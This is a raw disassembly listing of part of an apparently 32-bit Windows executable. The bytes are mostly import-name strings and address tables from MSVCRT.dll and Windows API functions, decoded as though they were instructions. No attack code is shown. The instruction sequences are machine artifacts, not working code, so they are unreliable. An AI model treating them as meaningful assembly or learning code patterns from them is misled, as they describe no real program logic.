  41d5a3:	add    BYTE PTR [esi-0x47fffe26],ch
  41d5a9:	fiadd  DWORD PTR [ecx]
  41d5ab:	add    ah,cl
  41d5ad:	fiadd  DWORD PTR [ecx]
  41d5af:	add    ah,bl
  41d5b1:	fiadd  DWORD PTR [ecx]
  41d5b3:	add    al,ch
  41d5b5:	fiadd  DWORD PTR [ecx]
  41d5b7:	add    dl,dh
  41d5b9:	fiadd  DWORD PTR [ecx]
  41d5bb:	add    ah,bh
  41d5bd:	fiadd  DWORD PTR [ecx]
  41d5bf:	add    BYTE PTR [eax],al
  41d5c1:	add    BYTE PTR [eax],al
  41d5c3:	add    BYTE PTR [edx],dl
  41d5c5:	fild   DWORD PTR [ecx]
  41d5c7:	add    BYTE PTR [eax],dh
  41d5c9:	fild   DWORD PTR [ecx]
  41d5cb:	add    BYTE PTR [eax-0x25],cl
  41d5ce:	add    DWORD PTR [eax],eax
  41d5d0:	push   0x7a0001db
  41d5d5:	fild   DWORD PTR [ecx]
  41d5d7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d5dd:	fild   DWORD PTR [ecx]
  41d5df:	add    dl,al
  41d5e1:	fild   DWORD PTR [ecx]
  41d5e3:	add    dh,dl
  41d5e5:	fild   DWORD PTR [ecx]
  41d5e7:	add    dh,ah
  41d5e9:	fild   DWORD PTR [ecx]
  41d5eb:	add    BYTE PTR [edx],al
  41d5ed:	fadd   QWORD PTR [ecx]
  41d5ef:	add    BYTE PTR [esp+ebx*8],bl
  41d5f2:	add    DWORD PTR [eax],eax
  41d5f4:	sub    al,0xdc
  41d5f6:	add    DWORD PTR [eax],eax
  41d5f8:	cmp    bl,ah
  41d5fa:	add    DWORD PTR [eax],eax
  41d5fc:	dec    esi
  41d5fd:	fadd   QWORD PTR [ecx]
  41d5ff:	add    BYTE PTR [edx-0x24],bl
  41d602:	add    DWORD PTR [eax],eax
  41d604:	data16 fadd QWORD PTR [ecx]
  41d607:	add    BYTE PTR [eax-0x24],bh
  41d60a:	add    DWORD PTR [eax],eax
  41d60c:	mov    bl,ah
  41d60e:	add    DWORD PTR [eax],eax
  41d610:	pushf  
  41d611:	fadd   QWORD PTR [ecx]
  41d613:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d619:	fadd   QWORD PTR [ecx]
  41d61b:	add    ah,cl
  41d61d:	fadd   QWORD PTR [ecx]
  41d61f:	add    al,ah
  41d621:	fadd   QWORD PTR [ecx]
  41d623:	add    ah,dh
  41d625:	fadd   QWORD PTR [ecx]
  41d627:	add    BYTE PTR [esi],al
  41d629:	fld    QWORD PTR [ecx]
  41d62b:	add    BYTE PTR [esi],dl
  41d62d:	fld    QWORD PTR [ecx]
  41d62f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d636:	add    DWORD PTR [eax],eax
  41d638:	dec    edx
  41d639:	fld    QWORD PTR [ecx]
  41d63b:	add    BYTE PTR [eax-0x23],bl
  41d63e:	add    DWORD PTR [eax],eax
  41d640:	pusha  
  41d641:	fld    QWORD PTR [ecx]
  41d643:	add    BYTE PTR [esi-0x23],ch
  41d646:	add    DWORD PTR [eax],eax
  41d648:	test   ch,bl
  41d64a:	add    DWORD PTR [eax],eax
  41d64c:	mov    ds,ebp
  41d64e:	add    DWORD PTR [eax],eax
  41d650:	sahf   
  41d651:	fld    QWORD PTR [ecx]
  41d653:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d65a:	add    DWORD PTR [eax],eax
  41d65c:	fcmovu st,st(5)
  41d65e:	add    DWORD PTR [eax],eax
  41d660:	out    dx,al
  41d661:	fld    QWORD PTR [ecx]
  41d663:	add    ah,bh
  41d665:	fld    QWORD PTR [ecx]
  41d667:	add    BYTE PTR [eax],cl
  41d669:	fiadd  WORD PTR [ecx]
  41d66b:	add    BYTE PTR [eax],ah
  41d66d:	fiadd  WORD PTR [ecx]
  41d66f:	add    BYTE PTR [edx],dh
  41d671:	fiadd  WORD PTR [ecx]
  41d673:	add    BYTE PTR [edx-0x22],cl
  41d676:	add    DWORD PTR [eax],eax
  41d678:	pop    esp
  41d679:	fiadd  WORD PTR [ecx]
  41d67b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d67f:	add    BYTE PTR [edx-0x71fffe22],al
  41d685:	fiadd  WORD PTR [ecx]
  41d687:	add    BYTE PTR [edx+0x1de],ah
  41d68d:	add    BYTE PTR [eax],al
  41d68f:	add    al,al
  41d691:	fiadd  WORD PTR [ecx]
  41d693:	add    dl,cl
  41d695:	fiadd  WORD PTR [ecx]
  41d697:	add    ah,dl
  41d699:	fiadd  WORD PTR [ecx]
  41d69b:	add    al,ah
  41d69d:	fiadd  WORD PTR [ecx]
  41d69f:	add    ah,dh
  41d6a1:	fiadd  WORD PTR [ecx]
  41d6a3:	add    BYTE PTR [eax],al
  41d6a5:	fild   WORD PTR [ecx]
  41d6a7:	add    BYTE PTR [edx],bl
  41d6a9:	fild   WORD PTR [ecx]
  41d6ab:	add    BYTE PTR [edx],ch
  41d6ad:	fild   WORD PTR [ecx]
  41d6af:	add    BYTE PTR [eax],bh
  41d6b1:	fild   WORD PTR [ecx]
  41d6b3:	add    BYTE PTR [eax-0x21],dl
  41d6b6:	add    DWORD PTR [eax],eax
  41d6b8:	fild   WORD PTR fs:[ecx]
  41d6bb:	add    BYTE PTR [esi-0x21],bh
  41d6be:	add    DWORD PTR [eax],eax
  41d6c0:	mov    edi,ds
  41d6c2:	add    DWORD PTR [eax],eax
  41d6c4:	cwde   
  41d6c5:	fild   WORD PTR [ecx]
  41d6c7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d6cd:	fild   WORD PTR [ecx]
  41d6cf:	add    dh,al
  41d6d1:	fild   WORD PTR [ecx]
  41d6d3:	add    dh,dl
  41d6d5:	fild   WORD PTR [ecx]
  41d6d7:	add    dh,ah
  41d6d9:	fild   WORD PTR [ecx]
  41d6db:	add    ah,bh
  41d6dd:	fild   WORD PTR [ecx]
  41d6df:	add    BYTE PTR [eax],cl
  41d6e1:	loopne 0x41d6e4
  41d6e3:	add    BYTE PTR [eax+eiz*8],dl
  41d6e6:	add    DWORD PTR [eax],eax
  41d6e8:	sub    al,ah
  41d6ea:	add    DWORD PTR [eax],eax
  41d6ec:	ds loopne 0x41d6f0
  41d6ef:	add    BYTE PTR [esi-0x20],dl
  41d6f2:	add    DWORD PTR [eax],eax
  41d6f4:	data16 loopne 0x41d6f8
  41d6f7:	add    BYTE PTR [edx-0x20],dh
  41d6fa:	add    DWORD PTR [eax],eax
  41d6fc:	xchg   al,ah
  41d6fe:	add    DWORD PTR [eax],eax
  41d700:	xchg   esp,eax
  41d701:	loopne 0x41d704
  41d703:	add    BYTE PTR [esi-0x47fffe20],ch
  41d709:	loopne 0x41d70c
  41d70b:	add    dl,cl
  41d70d:	loopne 0x41d710
  41d70f:	add    ah,bl
  41d711:	loopne 0x41d714
  41d713:	add    dh,ch
  41d715:	loopne 0x41d718
  41d717:	add    dh,bh
  41d719:	loopne 0x41d71c
  41d71b:	add    BYTE PTR [eax],cl
  41d71d:	loope  0x41d720
  41d71f:	add    BYTE PTR [esi],bl
  41d721:	loope  0x41d724
  41d723:	add    BYTE PTR [edx],dh
  41d725:	loope  0x41d728
  41d727:	add    BYTE PTR [esi-0x1f],al
  41d72a:	add    DWORD PTR [eax],eax
  41d72c:	push   esi
  41d72d:	loope  0x41d730
  41d72f:	add    BYTE PTR [esi-0x1f],ah
  41d732:	add    DWORD PTR [eax],eax
  41d734:	jb     0x41d717
  41d736:	add    DWORD PTR [eax],eax
  41d738:	test   cl,ah
  41d73a:	add    DWORD PTR [eax],eax
  41d73c:	mov    al,ds:0xb60001e1
  41d741:	loope  0x41d744
  41d743:	add    dl,al
  41d745:	loope  0x41d748
  41d747:	add    dh,dl
  41d749:	loope  0x41d74c
  41d74b:	add    BYTE PTR [eax],al
  41d74d:	add    BYTE PTR [eax],al
  41d74f:	add    ah,dh
  41d751:	loope  0x41d754
  41d753:	add    BYTE PTR [edx+eiz*8],al
  41d756:	add    DWORD PTR [eax],eax
  41d758:	adc    al,0xe2
  41d75a:	add    DWORD PTR [eax],eax
  41d75c:	and    ah,dl
  41d75e:	add    DWORD PTR [eax],eax
  41d760:	xor    dl,ah
  41d762:	add    DWORD PTR [eax],eax
  41d764:	ds loop 0x41d768
  41d767:	add    BYTE PTR [edx-0x1e],dl
  41d76a:	add    DWORD PTR [eax],eax
  41d76c:	pusha  
  41d76d:	loop   0x41d770
  41d76f:	add    BYTE PTR [edx-0x1e],bh
  41d772:	add    DWORD PTR [eax],eax
  41d774:	xchg   dl,ah
  41d776:	add    DWORD PTR [eax],eax
  41d778:	cwde   
  41d779:	loop   0x41d77c
  41d77b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d782:	add    DWORD PTR [eax],eax
  41d784:	int3   
  41d785:	loop   0x41d788
  41d787:	add    dh,dl
  41d789:	loop   0x41d78c
  41d78b:	add    al,ah
  41d78d:	loop   0x41d790
  41d78f:	add    dl,bh
  41d791:	loop   0x41d794
  41d793:	add    BYTE PTR [edx],cl
  41d795:	jecxz  0x41d798
  41d797:	add    BYTE PTR [edx],bl
  41d799:	jecxz  0x41d79c
  41d79b:	add    BYTE PTR [ebx+eiz*8],ah
  41d79e:	add    DWORD PTR [eax],eax
  41d7a0:	xor    al,0xe3
  41d7a2:	add    DWORD PTR [eax],eax
  41d7a4:	inc    eax
  41d7a5:	jecxz  0x41d7a8
  41d7a7:	add    BYTE PTR [esi-0x1d],cl
  41d7aa:	add    DWORD PTR [eax],eax
  41d7ac:	fs jecxz 0x41d7b0
  41d7af:	add    BYTE PTR [esi-0x1d],dh
  41d7b2:	add    DWORD PTR [eax],eax
  41d7b4:	mov    fs,ebx
  41d7b6:	add    DWORD PTR [eax],eax
  41d7b8:	mov    ds:0xb00001e3,al
  41d7bd:	jecxz  0x41d7c0
  41d7bf:	add    dl,al
  41d7c1:	jecxz  0x41d7c4
  41d7c3:	add    dh,cl
  41d7c5:	jecxz  0x41d7c8
  41d7c7:	add    dh,bl
  41d7c9:	jecxz  0x41d7cc
  41d7cb:	add    ah,ch
  41d7cd:	jecxz  0x41d7d0
  41d7cf:	add    BYTE PTR [eax],al
  41d7d1:	in     al,0x1
  41d7d3:	add    BYTE PTR [esi],cl
  41d7d5:	in     al,0x1
  41d7d7:	add    BYTE PTR [edx],ch
  41d7d9:	in     al,0x1
  41d7db:	add    BYTE PTR [esp+eiz*8],bh
  41d7de:	add    DWORD PTR [eax],eax
  41d7e0:	dec    esp
  41d7e1:	in     al,0x1
  41d7e3:	add    BYTE PTR [esi-0x1c],bl
  41d7e6:	add    DWORD PTR [eax],eax
  41d7e8:	push   0xffffffe4
  41d7ea:	add    DWORD PTR [eax],eax
  41d7ec:	jl     0x41d7d2
  41d7ee:	add    DWORD PTR [eax],eax
  41d7f0:	mov    ah,ah
  41d7f2:	add    DWORD PTR [eax],eax
  41d7f4:	cwde   
  41d7f5:	in     al,0x1
  41d7f7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d7fd:	in     al,0x1
  41d7ff:	add    al,dl
  41d801:	in     al,0x1
  41d803:	add    dl,ah
  41d805:	in     al,0x1
  41d807:	add    al,dh
  41d809:	in     al,0x1
  41d80b:	add    BYTE PTR [eax],cl
  41d80d:	in     eax,0x1
  41d80f:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d816:	add    DWORD PTR [eax],eax
  41d818:	ds in  eax,0x1
  41d81b:	add    BYTE PTR [edx-0x1b],cl
  41d81e:	add    DWORD PTR [eax],eax
  41d820:	pop    edx
  41d821:	in     eax,0x1
  41d823:	add    BYTE PTR [esi-0x1b],ch
  41d826:	add    DWORD PTR [eax],eax
  41d828:	jle    0x41d80f
  41d82a:	add    DWORD PTR [eax],eax
  41d82c:	nop
  41d82d:	in     eax,0x1
  41d82f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d836:	add    DWORD PTR [eax],eax
  41d838:	mov    eax,0xca0001e5
  41d83d:	in     eax,0x1
  41d83f:	add    dl,bl
  41d841:	in     eax,0x1
  41d843:	add    dh,ah
  41d845:	in     eax,0x1
  41d847:	add    ah,bh
  41d849:	in     eax,0x1
  41d84b:	add    BYTE PTR [esi],cl
  41d84d:	out    0x1,al
  41d84f:	add    BYTE PTR [eax],ch
  41d851:	out    0x1,al
  41d853:	add    BYTE PTR [edx],bh
  41d855:	out    0x1,al
  41d857:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d85b:	add    BYTE PTR [eax-0x1a],bl
  41d85e:	add    DWORD PTR [eax],eax
  41d860:	push   0x7a0001e6
  41d865:	out    0x1,al
  41d867:	add    BYTE PTR [esi-0x67fffe1a],al
  41d86d:	out    0x1,al
  41d86f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d875:	out    0x1,al
  41d877:	add    ah,bl
  41d879:	out    0x1,al
  41d87b:	add    dl,ch
  41d87d:	out    0x1,al
  41d87f:	add    al,bh
  41d881:	out    0x1,al
  41d883:	add    BYTE PTR [esi],cl
  41d885:	out    0x1,eax
  41d887:	add    BYTE PTR [esi],bl
  41d889:	out    0x1,eax
  41d88b:	add    BYTE PTR [edx],ch
  41d88d:	out    0x1,eax
  41d88f:	add    BYTE PTR [edx],bh
  41d891:	out    0x1,eax
  41d893:	add    BYTE PTR [edx-0x19],cl
  41d896:	add    DWORD PTR [eax],eax
  41d898:	pop    esp
  41d899:	out    0x1,eax
  41d89b:	add    BYTE PTR [eax-0x19],ch
  41d89e:	add    DWORD PTR [eax],eax
  41d8a0:	jbe    0x41d889
  41d8a2:	add    DWORD PTR [eax],eax
  41d8a4:	xchg   bh,ah
  41d8a6:	add    DWORD PTR [eax],eax
  41d8a8:	cwde   
  41d8a9:	out    0x1,eax
  41d8ab:	add    BYTE PTR [eax-0x45fffe19],ch
  41d8b1:	out    0x1,eax
  41d8b3:	add    al,dl
  41d8b5:	out    0x1,eax
  41d8b7:	add    dh,ah
  41d8b9:	out    0x1,eax
  41d8bb:	add    dh,dh
  41d8bd:	out    0x1,eax
  41d8bf:	add    BYTE PTR [edx],al
  41d8c1:	call   0xe859d8c7
  41d8c6:	add    DWORD PTR [eax],eax
  41d8c8:	and    al,0xe8
  41d8ca:	add    DWORD PTR [eax],eax
  41d8cc:	xor    al,0xe8
  41d8ce:	add    DWORD PTR [eax],eax
  41d8d0:	dec    eax
  41d8d1:	call   0xe897d8d7
  41d8d6:	add    DWORD PTR [eax],eax
  41d8d8:	callw  0xd8dd
  41d8dc:	jp     0x41d8c6
  41d8de:	add    DWORD PTR [eax],eax
  41d8e0:	xchg   al,ch
  41d8e2:	add    DWORD PTR [eax],eax
  41d8e4:	xchg   esi,eax
  41d8e5:	call   0xe8e3d8eb
  41d8ea:	add    DWORD PTR [eax],eax
  41d8ec:	mov    dl,0xe8
  41d8ee:	add    DWORD PTR [eax],eax
  41d8f0:	(bad)  
  41d8f1:	call   0xe913d8f7
  41d8f6:	add    DWORD PTR [eax],eax
  41d8f8:	in     al,0xe8
  41d8fa:	add    DWORD PTR [eax],eax
  41d8fc:	lock call 0xe93fd903
  41d902:	add    DWORD PTR [eax],eax
  41d904:	or     al,0xe9
  41d906:	add    DWORD PTR [eax],eax
  41d908:	sbb    ch,cl
  41d90a:	add    DWORD PTR [eax],eax
  41d90c:	add    BYTE PTR [eax],al
  41d90e:	add    BYTE PTR [eax],al
  41d910:	or     al,0x2
  41d912:	add    BYTE PTR [eax+0x0],al
  41d918:	cmc    
  41d919:	add    BYTE PTR [edi+0x63],bl
  41d91c:	outs   dx,DWORD PTR ds:[esi]
  41d91d:	outs   dx,BYTE PTR ds:[esi]
  41d91e:	je     0x41d992
  41d920:	outs   dx,DWORD PTR ds:[esi]
  41d921:	ins    BYTE PTR es:[edi],dx
  41d922:	data16 jo 0x41d925
  41d925:	add    BYTE PTR [ebx],al
  41d927:	add    al,0x73
  41d929:	jns    0x41d99e
  41d92b:	je     0x41d992
  41d92d:	ins    DWORD PTR es:[edi],dx
  41d92e:	add    BYTE PTR [eax],al
  41d930:	fwait
  41d931:	add    ebp,DWORD PTR [ecx+0x73]
  41d934:	jo     0x41d9a8
  41d936:	imul   ebp,DWORD PTR [esi+0x74],0x61035a00
  41d93d:	je     0x41d9ae
  41d93f:	ins    BYTE PTR es:[edi],dx
  41d940:	add    BYTE PTR [eax],al
  41d942:	jmp    0x7363:0x72747303
  41d949:	jo     0x41d9b9
  41d94b:	add    BYTE PTR [edi+0x73626d03],dh
  41d951:	je     0x41d9c2
  41d953:	ja     0x41d9b8
  41d955:	jae    0x41d957
  41d957:	add    bh,ah
  41d959:	add    esi,DWORD PTR [ebx+0x74]
  41d95c:	jb     0x41d9c1
  41d95e:	outs   dx,DWORD PTR ds:[esi]
  41d95f:	ins    BYTE PTR es:[edi],dx
  41d960:	ins    BYTE PTR es:[edi],dx
  41d961:	add    ch,al
  41d963:	add    esi,DWORD PTR [eax+0x72]
  41d966:	imul   ebp,DWORD PTR [esi+0x74],0xb000066
  41d96d:	add    al,0x74
  41d96f:	outs   dx,DWORD PTR ds:[esi]
  41d970:	ja     0x41d9de
  41d972:	outs   dx,DWORD PTR ds:[esi]
  41d973:	ja     0x41d9da
  41d975:	jb     0x41d977
  41d977:	add    BYTE PTR [esi],al
  41d979:	add    al,0x74
  41d97b:	imul   ebp,DWORD PTR [ebp+0x65],0x36d0000
  41d982:	data16 addr16 gs je 0x41d9ea
  41d987:	add    BYTE PTR [ebx+0x735f5f00],dh
  41d98d:	gs je  0x41d9ef
  41d990:	popa   
  41d991:	jo     0x41da03
  41d993:	pop    edi
  41d994:	je     0x41da0f
  41d996:	jo     0x41d9fd
  41d998:	add    BYTE PTR [eax],al
  41d99a:	mov    al,ds:0x705f5f00
  41d99f:	pop    edi
  41d9a0:	pop    edi
  41d9a1:	ins    WORD PTR es:[edi],dx
  41d9a3:	outs   dx,DWORD PTR ds:[esi]
  41d9a4:	fs add BYTE PTR gs:[eax],al
  41d9a8:	xchg   esp,eax
  41d9a9:	add    ebp,DWORD PTR [ecx+0x73]
  41d9ac:	popa   
  41d9ad:	ins    BYTE PTR es:[edi],dx
  41d9ae:	outs   dx,BYTE PTR ds:[esi]
  41d9af:	jne    0x41da1e
  41d9b1:	add    dl,bh
  41d9b3:	add    esi,DWORD PTR [ebx+0x74]
  41d9b6:	jb     0x41da2c
  41d9b8:	outs   dx,DWORD PTR ds:[esi]
  41d9b9:	imul   eax,DWORD PTR [eax],0x0
  41d9bc:	sbb    al,0x4
  41d9be:	ja     0x41da23
  41d9c0:	jae    0x41da25
  41d9c2:	popa   
  41d9c3:	je     0x41d9c5
  41d9c5:	add    BYTE PTR [ecx+0x74626d03],bh
  41d9cb:	outs   dx,DWORD PTR ds:[esi]
  41d9cc:	ja     0x41da31
  41d9ce:	add    BYTE PTR [eax],al
  41d9d0:	fwait
  41d9d1:	add    BYTE PTR [edi+0x5f],bl
  41d9d4:	jo     0x41da35
  41d9d6:	pop    edi
  41d9d7:	arpl   WORD PTR [edi+0x6d],bp
  41d9da:	ins    DWORD PTR es:[edi],dx
  41d9db:	outs   dx,DWORD PTR ds:[esi]
  41d9dc:	fs add BYTE PTR gs:[eax],al
  41d9e0:	loope  0x41d9e5
  41d9e2:	jae    0x41da57
  41d9e4:	arpl   WORD PTR [ecx+0x6e],sp
  41d9e7:	data16 add BYTE PTR [eax],al
  41d9ea:	fild   DWORD PTR [eax]
  41d9ec:	pop    edi
  41d9ed:	popa   
  41d9ee:	ins    DWORD PTR es:[edi],dx
  41d9ef:	jae    0x41da58
  41d9f1:	pop    edi
  41d9f2:	gs js  0x41da5e
  41d9f5:	je     0x41d9f7
  41d9f7:	add    BYTE PTR [esi+0x6e695f01],al
  41d9fd:	imul   esi,DWORD PTR [esp+esi*2+0x65],0xc8006d72
  41da05:	add    esi,DWORD PTR [eax+0x75]
  41da08:	je     0x41da6d
  41da0a:	push   0xb1007261
  41da0f:	add    ebp,DWORD PTR [edi+ebp*2+0x63]
  41da13:	popa   
  41da14:	ins    BYTE PTR es:[edi],dx
  41da15:	je     0x41da80
  41da17:	ins    DWORD PTR es:[edi],dx
  41da18:	add    BYTE PTR gs:[ecx+0x3],ch
  41da1c:	data16 arpl WORD PTR [edi+ebp*2+0x73],bp
  41da21:	add    BYTE PTR gs:[eax],al
  41da24:	or     eax,0x676e7504
  41da29:	gs je  0x41da8f
  41da2c:	add    BYTE PTR [eax],al
  41da2e:	sub    DWORD PTR [edi+esi*2],eax
  41da31:	arpl   WORD PTR [ebx+0x6e],si
  41da34:	arpl   WORD PTR [eax+0x79],si
  41da37:	add    bh,cl
  41da39:	add    esi,DWORD PTR [edx+0x61]
  41da3c:	outs   dx,BYTE PTR ds:[esi]
  41da3d:	add    BYTE PTR fs:[eax],al
  41da40:	sahf   
  41da41:	add    DWORD PTR [edi+0x69],ebx
  41da44:	jae    0x41dab3
  41da46:	bound  esp,QWORD PTR [edx+0x6c]
  41da49:	gs popa 
  41da4b:	add    BYTE PTR fs:[eax],al
  41da4e:	add    DWORD PTR [ebx+esi*2],eax
  41da51:	ja     0x41dac6
  41da53:	arpl   WORD PTR [ecx+0x6e],sp
  41da56:	data16 add BYTE PTR [ebx+0x77736903],ch
  41da5d:	js     0x41dac3
  41da5f:	imul   esp,DWORD PTR [edi+0x69],0x4280074
  41da66:	ja     0x41dacb
  41da68:	jae    0x41dad8
  41da6a:	arpl   WORD PTR [ebp+0x70],bp
  41da6d:	add    BYTE PTR [esi+0x75736903],bl
  41da73:	jo     0x41dae5
  41da75:	gs jb  0x41da78
  41da78:	push   edx
  41da79:	add    BYTE PTR [edi+0x58],bl
  41da7c:	arpl   WORD PTR [eax+0x74],si
  41da7f:	inc    esi
  41da80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x1230072
  41da88:	pop    edi
  41da89:	gs js  0x41daf5
  41da8c:	je     0x41da8e
  41da8e:	sbb    BYTE PTR [esi+esi*2],al
  41da91:	jae    0x41db0a
  41da93:	jo     0x41db07
  41da95:	imul   ebp,DWORD PTR [esi+0x74],0xe80066
  41da9c:	pop    edi
  41da9d:	arpl   WORD PTR [ebp+0x78],sp
  41daa0:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x7362035b
  41daa8:	gs popa 
  41daaa:	jb     0x41db0f
  41daac:	push   0x7303e800
  41dab1:	je     0x41db25
  41dab3:	arpl   WORD PTR [eax+0x79],si
  41dab6:	add    BYTE PTR [eax],al
  41dab8:	mov    ch,0x0
  41daba:	pop    edi
  41dabb:	pop    edi
  41dabc:	jae    0x41db23
  41dabe:	je     0x41db35
  41dac0:	jae    0x41db27
  41dac2:	jb     0x41db31
  41dac4:	popa   
  41dac5:	je     0x41db2f
  41dac7:	gs jb  0x41db3c
  41daca:	add    BYTE PTR [eax],al
  41dacc:	jb     0x41dace
  41dace:	pop    edi
  41dacf:	pop    edi
  41dad0:	addr16 gs je 0x41db41
  41dad4:	popa   
  41dad5:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  41dadc:	pop    edi
  41dadd:	add    esp,DWORD PTR [ebx+0x6c]
  41dae0:	gs popa 
  41dae2:	jb     0x41db49
  41dae4:	jb     0x41db58
  41dae6:	add    BYTE PTR [eax],al
  41dae8:	and    DWORD PTR [edi+esi*2],eax
  41daeb:	arpl   WORD PTR [ebx+0x63],si
  41daee:	jo     0x41db69
  41daf0:	add    BYTE PTR [eax],al
  41daf2:	std    
  41daf3:	add    esi,DWORD PTR [ebx+0x74]
  41daf6:	jb     0x41db6c
  41daf8:	outs   dx,DWORD PTR ds:[esi]
  41daf9:	jne    0x41db67
  41dafb:	add    bl,al
  41dafd:	add    esi,DWORD PTR [eax+0x65]
  41db00:	jb     0x41db74
  41db02:	outs   dx,DWORD PTR ds:[esi]
  41db03:	jb     0x41db05
  41db05:	add    BYTE PTR [ebp+0x53],cl
  41db08:	push   esi
  41db09:	inc    ebx
  41db0a:	push   edx
  41db0b:	push   esp
  41db0c:	cs fs ins BYTE PTR es:[edi],dx
  41db0f:	ins    BYTE PTR es:[edi],dx
  41db10:	add    BYTE PTR [eax],al
  41db12:	inc    ecx
  41db13:	add    al,0x53
  41db15:	gs je  0x41db6d
  41db18:	outs   dx,BYTE PTR ds:[esi]
  41db19:	push   0x6c646e61
  41db1e:	gs fs inc ebp
  41db21:	js     0x41db86
  41db23:	gs jo  0x41db9a
  41db26:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  41db2d:	gs jb  0x41db30
  41db30:	jmp    0x6946:0x74654701
  41db37:	ins    BYTE PTR es:[edi],dx
  41db38:	gs inc ecx
  41db3a:	je     0x41dbb0
  41db3c:	jb     0x41dba7
  41db3e:	bound  esi,QWORD PTR [ebp+0x74]
  41db41:	gs jae 0x41db89
  41db44:	js     0x41db87
  41db46:	add    BYTE PTR [eax],al
  41db48:	pop    esp
  41db49:	add    DWORD PTR [esi+0x69],eax
  41db4c:	outs   dx,BYTE PTR ds:[esi]
  41db4d:	fs inc esi
  41db4f:	imul   esi,DWORD PTR [edx+0x73],0x61684374
  41db56:	outs   dx,BYTE PTR ds:[esi]
  41db57:	addr16 gs dec esi
  41db5a:	outs   dx,DWORD PTR ds:[esi]
  41db5b:	je     0x41dbc6
  41db5d:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41db63:	outs   dx,DWORD PTR ds:[esi]
  41db64:	outs   dx,BYTE PTR ds:[esi]
  41db65:	push   edi
  41db66:	add    BYTE PTR [eax],al
  41db68:	mov    ds:0x6c614300,al
  41db6d:	ins    BYTE PTR es:[edi],dx
  41db6e:	dec    esi
  41db6f:	popa   
  41db70:	ins    DWORD PTR es:[edi],dx
  41db71:	gs fs push eax
  41db74:	imul   esi,DWORD PTR [eax+0x65],0xdb000057
  41db7b:	add    cl,BYTE PTR [ecx+0x73]
  41db7e:	push   esi
  41db7f:	popa   
  41db80:	ins    BYTE PTR es:[edi],dx
  41db81:	imul   esp,DWORD PTR [esp+ecx*2+0x6f],0x656c6163
  41db89:	add    BYTE PTR [ebp+0x1],ah
  41db8c:	inc    esi
  41db8d:	imul   ebp,DWORD PTR [esi+0x64],0x7478654e
  41db94:	inc    ebx
  41db95:	push   0x65676e61
  41db9a:	dec    esi
  41db9b:	outs   dx,DWORD PTR ds:[esi]
  41db9c:	je     0x41dc07
  41db9e:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41dba4:	outs   dx,DWORD PTR ds:[esi]
  41dba5:	outs   dx,BYTE PTR ds:[esi]
  41dba6:	add    BYTE PTR [eax],al
  41dba8:	cmp    BYTE PTR [ebx+edx*2],al
  41dbab:	gs je  0x41dc02
  41dbae:	push   0x64616572
  41dbb3:	inc    ebp
  41dbb4:	js     0x41dc1b
  41dbb6:	arpl   WORD PTR [ebp+0x74],si
  41dbb9:	imul   ebp,DWORD PTR [edi+0x6e],0x74617453
  41dbc0:	add    BYTE PTR gs:[esi],bl
  41dbc3:	add    al,BYTE PTR [edi+0x65]
  41dbc6:	je     0x41dc18
  41dbc8:	jb     0x41dc33
  41dbca:	outs   dx,DWORD PTR ds:[esi]
  41dbcb:	jb     0x41dc36
  41dbcd:	je     0x41dc48
  41dbcf:	inc    ebx
  41dbd0:	ins    BYTE PTR es:[edi],dx
  41dbd1:	popa   
  41dbd2:	jae    0x41dc47
  41dbd4:	add    BYTE PTR [eax],al
  41dbd6:	add    DWORD PTR [bp+0x69],eax
  41dbda:	outs   dx,BYTE PTR ds:[esi]
  41dbdb:	fs dec esi
  41dbdd:	gs js  0x41dc54
  41dbe0:	inc    esi
  41dbe1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x57048d00
  41dbe9:	popa   
  41dbea:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  41dbf2:	je     0x41dc5d
  41dbf4:	jo     0x41dc62
  41dbf6:	gs dec edi
  41dbf8:	bound  ebp,QWORD PTR [edx+0x65]
  41dbfb:	arpl   WORD PTR [ebx+esi*2+0x45],si
  41dbff:	js     0x41dc01
  41dc01:	add    BYTE PTR [edi],ah
  41dc03:	add    al,0x53
  41dc05:	gs je  0x41dc56
  41dc08:	popa   
  41dc09:	ins    DWORD PTR es:[edi],dx
  41dc0a:	gs fs push eax
  41dc0d:	imul   esi,DWORD PTR [eax+0x65],0x646e6148
  41dc14:	ins    BYTE PTR es:[edi],dx
  41dc15:	gs push ebx
  41dc17:	je     0x41dc7a
  41dc19:	je     0x41dc80
  41dc1b:	add    bl,bh
  41dc1d:	add    DWORD PTR [edi+0x65],eax
  41dc20:	je     0x41dc6e
  41dc22:	popa   
  41dc23:	jae    0x41dc99
  41dc25:	inc    ebp
  41dc26:	jb     0x41dc9a
  41dc28:	outs   dx,DWORD PTR ds:[esi]
  41dc29:	jb     0x41dc2b
  41dc2b:	add    BYTE PTR [eax+0x6f6c4702],dl
  41dc31:	bound  esp,QWORD PTR [ecx+0x6c]
  41dc34:	inc    esi
  41dc35:	jb     0x41dc9c
  41dc37:	add    BYTE PTR gs:[eax],al
  41dc3a:	or     al,BYTE PTR [edx]
  41dc3c:	inc    edi
  41dc3d:	gs je  0x41dc8d
  41dc40:	outs   dx,DWORD PTR ds:[esi]
  41dc41:	fs jne 0x41dcb0
  41dc44:	gs dec eax
  41dc46:	popa   
  41dc47:	outs   dx,BYTE PTR ds:[esi]
  41dc48:	fs ins BYTE PTR es:[edi],dx
  41dc4a:	gs inc ecx
  41dc4c:	add    BYTE PTR [eax],al
  41dc4e:	js     0x41dc53
  41dc50:	push   edx
  41dc51:	gs popa 
  41dc53:	fs inc esi
  41dc55:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47019000
  41dc5d:	gs je  0x41dca3
